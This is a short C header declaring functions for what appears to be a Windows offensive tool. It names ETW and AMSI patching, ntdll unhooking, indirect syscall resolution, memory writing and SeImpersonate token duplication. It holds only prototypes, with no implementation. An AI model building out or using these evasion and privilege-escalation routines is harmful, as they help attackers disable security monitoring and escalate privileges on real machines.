#pragma once
#include <Windows.h>
#include <winternl.h>

BOOL EtwPatch();
extern DWORD g_ssn;
extern PVOID g_syscall;

NTSTATUS iNtProtectVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
NTSTATUS iNtOpenThreadToken(HANDLE, ACCESS_MASK, BOOLEAN, PHANDLE);
NTSTATUS iNtDuplicateToken(HANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, BOOLEAN, TOKEN_TYPE, PHANDLE);
NTSTATUS iNtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

DWORD getSSN(char* funcName);
PVOID getSyscallAddr(char* funcName);
PVOID manual_procaddress(HMODULE mod_handle, const char* funcName);
BOOL AmsiPatch();
BOOL check_seimpersonate();
BOOL unhook_Ntdll();
